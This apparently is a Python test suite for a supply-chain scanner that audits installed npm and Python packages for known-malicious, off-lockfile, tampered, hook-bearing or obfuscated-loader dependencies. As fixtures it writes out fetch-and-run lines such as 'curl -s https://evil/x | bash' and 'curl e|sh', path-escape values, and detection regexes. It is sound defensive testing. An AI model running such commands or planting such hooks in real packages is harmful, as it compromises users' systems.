#!/usr/bin/env python3
"""Installed-package audit (#1144): reconcile the on-disk tree against the lockfile + corpus.
Identity-on-disk (known-malicious installed pkg → INFECTED) and ghost (on disk, not locked →
SUSPICIOUS), even when the lockfile was never edited. No network; injected store."""
from __future__ import annotations

import base64
import hashlib
import json
import os
import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.dependencies import Advisory
from stayawake.bots.security.matchers.installed_package_audit import InstalledPackageAuditMatcher
from stayawake.bots.security.targets.base import ScanOptions, Target

_MAL_SIG = {"id": "malicious-installed-package", "category": "supply-chain-dep",
            "severity": "critical", "description": "malicious installed", "corpus": True}
_GHOST_SIG = {"id": "ghost-package", "category": "supply-chain-dep", "severity": "high",
              "confidence": "heuristic", "description": "off-lockfile"}
_TAMPER_SIG = {"id": "tampered-installed-package", "category": "supply-chain-dep",
               "severity": "critical", "confidence": "heuristic", "description": "tampered"}


class _FakeStore:
    def __init__(self, malicious):
        self._malicious = set(malicious)

    def is_empty(self):
        return False

    def advisory_for(self, purl):
        return Advisory(signature=_MAL_SIG) if purl.coordinate in self._malicious else None


def _repo(locked, installed) -> Target:
    d = Path(tempfile.mkdtemp())
    packages = {"": {"name": "app"}}
    for n in locked:
        packages[f"node_modules/{n}"] = {"version": "1.0.0"}
    (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": packages}))
    for name, ver in installed.items():
        pdir = d / "node_modules" / name
        pdir.mkdir(parents=True, exist_ok=True)
        (pdir / "package.json").write_text(json.dumps({"name": name, "version": ver}))
    return Target(d, str(d), ScanOptions())


def _scan(target, malicious=()):
    m = InstalledPackageAuditMatcher(store_factory=lambda sigs: _FakeStore(malicious))
    return m.scan(target, [_MAL_SIG, _GHOST_SIG, _TAMPER_SIG])


class TestInstalledPackageAudit(unittest.TestCase):
    def test_identity_ghost_and_locked(self):
        t = _repo(locked=["good"], installed={"good": "1.0.0", "evil": "9.9.9", "extra": "6.6.6"})
        by = {f.path.split("/")[1]: f for f in _scan(t, malicious={"evil@9.9.9"})}
        self.assertEqual(by["evil"].signature_id, "malicious-installed-package")  # known-bad → INFECTED tier
        self.assertEqual(by["extra"].signature_id, "ghost-package")               # off-lockfile → SUSPICIOUS
        self.assertNotIn("good", by, "a locked package must not be flagged")

    def test_scoped_ghost(self):
        t = _repo(locked=[], installed={"@scope/pkg": "2.0.0"})
        f = _scan(t)
        self.assertEqual(len(f), 1)
        self.assertEqual((f[0].signature_id, f[0].path),
                         ("ghost-package", "node_modules/@scope/pkg/package.json"))

    @unittest.skipUnless(hasattr(os, "mkfifo"), "FIFOs need POSIX mkfifo")
    def test_fifo_in_node_modules_does_not_hang(self):
        # #1226: the installed-tree audit walks node_modules itself (not via the engine's guarded read
        # path), so a FIFO named package.json must be skipped, not block open() forever.
        import signal
        signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(AssertionError("hung on a FIFO")))
        signal.alarm(30)
        self.addCleanup(signal.alarm, 0)
        d = Path(tempfile.mkdtemp())
        (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {}}))
        evil = d / "node_modules" / "evil"; evil.mkdir(parents=True)
        os.mkfifo(evil / "package.json")                  # a FIFO where a manifest is expected
        ok = d / "node_modules" / "ok"; ok.mkdir(parents=True)
        (ok / "package.json").write_text(json.dumps({"name": "ok", "version": "1.0.0"}))
        findings = _scan(Target(d, str(d), ScanOptions()))   # must simply COMPLETE
        # the FIFO pkg is skipped (no manifest read → no name/version → not audited); the real one is seen
        self.assertIn("ok", {f.path.split("/")[1] for f in findings if f.path.startswith("node_modules/")})

    def test_no_installed_tree_is_a_noop(self):
        # a remote clone with a lockfile but no node_modules → nothing (lockfile audit is the coverage)
        d = Path(tempfile.mkdtemp())
        (d / "package-lock.json").write_text('{"lockfileVersion":3,"packages":{}}')
        self.assertEqual(_scan(Target(d, str(d), ScanOptions())), [])


def _venv(installed, venv=".venv", info="dist-info") -> Path:
    """A repo with a venv site-packages: {dist_name: version} → `<name>-<ver>.<dist-info|egg-info>/`."""
    d = Path(tempfile.mkdtemp())
    sp = d / venv / "lib" / "python3.11" / "site-packages"
    for name, ver in installed.items():
        di = sp / f"{name}-{ver}.{info}"
        di.mkdir(parents=True)
        meta = "PKG-INFO" if info == "egg-info" else "METADATA"
        (di / meta).write_text(f"Metadata-Version: 2.1\nName: {name}\nVersion: {ver}\nSummary: x\n\nbody")
    return d


class TestPythonInstalledTree(unittest.TestCase):
    def test_identity_on_disk_is_infected_tier(self):
        # A known-malicious package installed in the venv → INFECTED tier, even with no lockfile.
        t = Target(_venv({"evil": "9.9.9", "requests": "2.31.0"}), "t", ScanOptions())
        by = {f.signature_id for f in _scan(t, malicious={"evil@9.9.9"})}
        self.assertIn("malicious-installed-package", by)

    def test_pep503_name_normalization(self):
        # `Flask_Foo` on disk must reconcile with a `flask-foo` advisory (PEP 503, as the resolver does).
        t = Target(_venv({"Flask_Foo": "1.0.0"}), "t", ScanOptions())
        by = {f.signature_id for f in _scan(t, malicious={"flask-foo@1.0.0"})}
        self.assertIn("malicious-installed-package", by)

    def test_egg_info_is_read(self):
        t = Target(_venv({"evil": "9.9.9"}, info="egg-info"), "t", ScanOptions())
        self.assertIn("malicious-installed-package",
                      {f.signature_id for f in _scan(t, malicious={"evil@9.9.9"})})

    def test_ghost_is_suppressed_for_python(self):
        # THE FP guarantee: requirements.txt lists only direct deps, so transitive site-packages must
        # NOT flag as ghosts (unlike npm). A clean venv package (not malicious) → no finding at all.
        t = Target(_venv({"some-transitive-dep": "1.2.3"}), "t", ScanOptions())
        self.assertEqual(_scan(t, malicious=set()), [], "python transitive install must not ghost")

    def test_site_packages_found_at_nested_venv(self):
        d = _venv({"evil": "9.9.9"}, venv="backend/env")     # non-root, non-standard venv name
        t = Target(d, "t", ScanOptions())
        self.assertIn("malicious-installed-package",
                      {f.signature_id for f in _scan(t, malicious={"evil@9.9.9"})})

    def test_no_venv_is_a_noop(self):
        d = Path(tempfile.mkdtemp())
        (d / "requirements.txt").write_text("requests==2.31.0\n")
        self.assertEqual(_scan(Target(d, str(d), ScanOptions())), [])


def _sha(data: bytes) -> str:
    return "sha256=" + base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()


def _pkg_with_record(files: dict, extra_record=()):
    """A venv package whose RECORD lists the CORRECT sha256 of each file in `files`; `extra_record` adds
    raw `(relpath, hashspec)` rows (e.g. an un-hashed `.pyc`, or an escaping path). Returns (repo, sp)."""
    d = Path(tempfile.mkdtemp())
    sp = d / ".venv" / "lib" / "python3.11" / "site-packages"
    di = sp / "pkg-1.0.0.dist-info"
    di.mkdir(parents=True)
    (di / "METADATA").write_text("Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n\nbody")
    rows = []
    for rel, data in files.items():
        fp = sp / rel
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_bytes(data)
        rows.append(f"{rel},{_sha(data)},{len(data)}")
    rows += [f"{rel},{h}," for rel, h in extra_record]
    (di / "RECORD").write_text("\n".join(rows) + "\n")
    return d, sp


class TestRecordIntegrity(unittest.TestCase):
    def test_clean_install_matches_record(self):
        d, _ = _pkg_with_record({"pkg/__init__.py": b"clean = 1\n"})
        self.assertEqual(_scan(Target(d, str(d), ScanOptions())), [])

    def test_tampered_file_is_flagged(self):
        d, sp = _pkg_with_record({"pkg/__init__.py": b"clean = 1\n"})
        (sp / "pkg" / "__init__.py").write_bytes(b"clean = 1\nimport os; os.system('curl e|sh')\n")
        f = _scan(Target(d, str(d), ScanOptions()))
        self.assertEqual([x.signature_id for x in f], ["tampered-installed-package"])
        self.assertIn("pkg/__init__.py", f[0].path)

    def test_unhashed_record_entry_is_not_verified(self):
        # A `.pyc` (or RECORD self) row has no sha256 → not checked, even if its bytes differ. This is
        # what makes the check FP-free on a clean install (`.pyc`/`__pycache__` are regenerated).
        d, sp = _pkg_with_record({"pkg/__init__.py": b"x\n"}, extra_record=[("pkg/__init__.pyc", "")])
        (sp / "pkg" / "__init__.pyc").write_bytes(b"regenerated bytecode differs")
        self.assertEqual(_scan(Target(d, str(d), ScanOptions())), [])

    def test_record_path_escaping_site_packages_is_ignored(self):
        # A RECORD row pointing outside site-packages must never be read/hashed (no repo/host escape).
        d, _ = _pkg_with_record({"pkg/__init__.py": b"x\n"},
                                extra_record=[("../../../../../../etc/hosts", "sha256=deadbeef")])
        self.assertEqual([x.signature_id for x in _scan(Target(d, str(d), ScanOptions()))], [])

    def test_missing_recorded_file_is_not_a_tamper(self):
        d, sp = _pkg_with_record({"pkg/__init__.py": b"x\n", "pkg/mod.py": b"y\n"})
        (sp / "pkg" / "mod.py").unlink()                 # listed but absent → not flagged as tampered
        self.assertEqual(_scan(Target(d, str(d), ScanOptions())), [])

    def test_npm_tree_has_no_integrity_check(self):
        from stayawake.bots.security.dependencies.installed import NpmInstalledTree
        t = _repo(locked=["good"], installed={"good": "1.0.0"})
        self.assertEqual(list(NpmInstalledTree().tampered(t)), [])   # npm has no on-disk RECORD


_HOOK_SIG = {"id": "installed-lifecycle-hook", "category": "supply-chain-dep", "severity": "critical",
             "description": "installed dep lifecycle hook runs a payload"}
# The npm-lifecycle patterns as they live in signatures.yml (confirmed + the heuristic exec one).
_NPM_SIGS = [
    {"id": "npm-lifecycle-dropper", "matcher": "npm-manifest", "pattern": r"\bsetup_bun\b"},
    {"id": "npm-lifecycle-remote-fetch", "matcher": "npm-manifest",
     "pattern": r"\b(?:curl|wget)\b[^|]{0,2048}\|\s*(?:sh|bash|node|bun|bunx|deno)\b"},
    {"id": "npm-lifecycle-exec", "matcher": "npm-manifest", "confidence": "heuristic",
     "pattern": r"\b(?:bun|bunx|deno|curl|wget)\b"},
]


def _npm_hooks_repo(hooks: dict) -> Target:
    """node_modules deps (all LOCKED, so no ghost noise) each with a postinstall = `hooks[name]`."""
    d = Path(tempfile.mkdtemp())
    packages = {"": {"name": "app"}}
    for name in hooks:
        packages[f"node_modules/{name}"] = {"version": "1.0.0"}
    (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": packages}))
    for name, cmd in hooks.items():
        pd = d / "node_modules" / name
        pd.mkdir(parents=True)
        (pd / "package.json").write_text(json.dumps(
            {"name": name, "version": "1.0.0", "scripts": {"postinstall": cmd}}))
    return Target(d, str(d), ScanOptions())


def _scan_hooks(target):
    m = InstalledPackageAuditMatcher(store_factory=lambda s: _FakeStore(()))
    sigs = [_MAL_SIG, _GHOST_SIG, _HOOK_SIG]
    return {f.signature_id for f in m.scan(target, sigs, all_signatures=sigs + _NPM_SIGS)}


class TestInstalledLifecycleHook(unittest.TestCase):
    def test_malicious_dependency_postinstall_flagged(self):
        # A malicious dep's postinstall in node_modules — invisible to the root-manifest/lockfile audit.
        self.assertIn("installed-lifecycle-hook",
                      _scan_hooks(_npm_hooks_repo({"evil": "curl -s https://evil/x | bash"})))

    def test_setup_bun_dropper_flagged(self):
        self.assertIn("installed-lifecycle-hook",
                      _scan_hooks(_npm_hooks_repo({"evil": "node setup_bun.js"})))

    def test_legit_postinstalls_are_clean(self):
        # 0 FP on realistic legit hooks (node-gyp/husky/binary-download/node-script).
        clean = _npm_hooks_repo({"a": "node-gyp rebuild", "b": "husky install",
                                 "c": "curl -sSL https://x/tool -o bin/t", "d": "node ./scripts/pi.js"})
        self.assertNotIn("installed-lifecycle-hook", _scan_hooks(clean))

    def test_heuristic_exec_pattern_not_applied_at_install_scale(self):
        # `bun run build` / a curl DOWNLOAD (no pipe) trip only the HEURISTIC exec pattern — which is
        # deliberately NOT applied to installed deps (it FPs across hundreds of third-party packages).
        self.assertNotIn("installed-lifecycle-hook",
                         _scan_hooks(_npm_hooks_repo({"a": "bun run build", "b": "deno task setup"})))

    def test_python_wheels_have_no_lifecycle_hooks(self):
        # A wheel install carries no npm-style lifecycle scripts → nothing to scan (no crash).
        t = Target(_venv({"requests": "2.31.0"}), "t", ScanOptions())
        self.assertNotIn("installed-lifecycle-hook", _scan_hooks(t))


def _npm_entry_repo(pkgs: dict) -> Target:
    """node_modules deps (locked) each with `main` = pkgs[name][0] and that file's content = [1]."""
    from stayawake.bots.security.signatures import load_signatures   # noqa: F401 (imported for parity)
    d = Path(tempfile.mkdtemp())
    packages = {"": {"name": "app"}}
    for name in pkgs:
        packages[f"node_modules/{name}"] = {"version": "1.0.0"}
    (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": packages}))
    for name, (mainf, content) in pkgs.items():
        pd = d / "node_modules" / name
        pd.mkdir(parents=True)
        (pd / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0", "main": mainf}))
        f = pd / mainf
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)
    return Target(d, str(d), ScanOptions())


def _scan_entries(target):
    from stayawake.bots.security.signatures import load_signatures
    s = load_signatures()
    ipa = s.get("installed-package-audit", [])                 # includes installed-entry-loader
    allsigs = [x for g in s.values() for x in g]               # includes the content code-loaders
    m = InstalledPackageAuditMatcher(store_factory=lambda _: _FakeStore(()))
    return {f.signature_id for f in m.scan(target, ipa, all_signatures=allsigs)}


class TestInstalledEntryLoader(unittest.TestCase):
    def test_loader_in_main_entry_flagged(self):
        t = _npm_entry_repo({"evil": ("index.js", "var _$_1e42 = sfL(0);\nString.fromCharCode(127);\n")})
        self.assertIn("installed-entry-loader", _scan_entries(t))

    def test_loader_in_nested_main_flagged(self):
        t = _npm_entry_repo({"evil": ("lib/main.js", "global['!'] = 1; var _$_a = sfL(0);\n")})
        self.assertIn("installed-entry-loader", _scan_entries(t))

    def test_legit_entries_are_clean(self):
        t = _npm_entry_repo({"a": ("index.js", "module.exports = require('./x')\n"),
                             "b": ("index.js", "'use strict';\nexports.f = () => 1\n")})
        self.assertNotIn("installed-entry-loader", _scan_entries(t))

    def test_entry_escaping_package_dir_is_ignored(self):
        # A `main` that points outside the package (repo/host escape) must be dropped, never read.
        d = Path(tempfile.mkdtemp())
        (d / "package-lock.json").write_text(
            '{"lockfileVersion":3,"packages":{"node_modules/c":{"version":"1.0.0"}}}')
        pd = d / "node_modules" / "c"
        pd.mkdir(parents=True)
        (pd / "package.json").write_text(json.dumps(
            {"name": "c", "version": "1.0.0", "main": "../../../../../../etc/hosts"}))
        self.assertNotIn("installed-entry-loader", _scan_entries(Target(d, str(d), ScanOptions())))

    def test_python_wheels_have_no_entries(self):
        self.assertNotIn("installed-entry-loader", _scan_entries(Target(_venv({"requests": "2.31.0"}), "t", ScanOptions())))


if __name__ == "__main__":
    unittest.main()
